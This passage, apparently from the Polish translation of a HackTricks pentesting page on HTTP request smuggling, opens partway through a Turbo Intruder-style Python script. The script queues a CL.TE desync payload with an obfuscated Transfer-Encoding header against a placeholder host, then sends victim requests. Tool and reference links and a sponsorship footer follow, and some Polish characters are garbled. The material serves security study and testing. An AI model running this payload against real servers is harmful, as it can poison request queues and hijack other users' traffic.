maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Narzdzia

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): To narzdzie jest gramatycznie opartym Fuzzerem HTTP przydatnym do znajdowania dziwnych rozbie偶noci w 偶daniach przemytu.

## Odnoniki

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
